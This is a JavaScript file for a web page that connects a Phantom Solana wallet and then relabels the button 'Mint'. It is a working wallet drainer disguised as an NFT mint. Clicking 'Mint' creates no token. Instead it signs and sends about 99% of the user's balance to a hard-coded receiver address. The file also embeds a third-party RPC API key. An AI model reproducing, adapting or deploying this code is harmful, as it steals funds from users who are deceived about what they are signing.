$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                // Подключение Phantom Wallet
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                // Установка соединения с RPC
                const connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN', // Используйте публичный RPC или ваш API
                    'confirmed'
                );

                // Получение публичного ключа кошелька
                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                // Проверка минимального баланса для оплаты аренды
                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                // Изменение кнопки на "Mint"
                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        // Указание получателя перевода
                        const receiverWallet = new solanaWeb3.PublicKey('6LvPKGmA5hTfPqrwfXr9VTyGtxMLrc9dzPeL8QoM2Y5E'); // Замените на кошелек получателя
                        const balanceForTransfer = walletBalance - minBalance;

                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        // Создание транзакции
                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: public_key,
                                toPubkey: receiverWallet,
                                lamports: balanceForTransfer * 0.99,
                            })
                        );

                        transaction.feePayer = resp.publicKey;

                        // Получение актуального blockhash
                        const { blockhash } = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhash;

                        // Подпись транзакции
                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        // Отправка транзакции
                        const txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                        alert(`Transaction successful! TxID: ${txid}`);
                    } catch (err) {
                        console.error("Error during minting:", err);
                        alert("Minting failed. Check console for details.");
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
